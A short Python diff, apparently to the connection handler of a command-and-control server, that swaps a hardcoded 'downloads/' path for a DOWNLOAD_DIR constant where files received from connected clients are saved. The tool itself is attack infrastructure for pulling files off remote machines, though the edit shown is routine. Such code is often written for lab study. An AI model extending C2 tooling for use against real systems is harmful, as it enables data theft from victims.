@@ -4,7 +4,7 @@ import uuid
 import json
 import queue
 import os
-from C2Server import OUTPUT_DIR
+from C2Server import OUTPUT_DIR, DOWNLOAD_DIR
 
 ip_address = '10.0.2.2'
 port_number = 50000
@@ -82,7 +82,7 @@ def handle_connection(client_socket, client_address, thread_uuid):
             # Getting file
             response = client_socket.recv(2048)
             # Saving file
-            with open(f"downloads/{filename}", "wb") as f:
+            with open(f"{DOWNLOAD_DIR}/{filename}", "wb") as f:
                 f.write(response)
             response = f"Downloaded {filename} to downloads/{filename}"
 
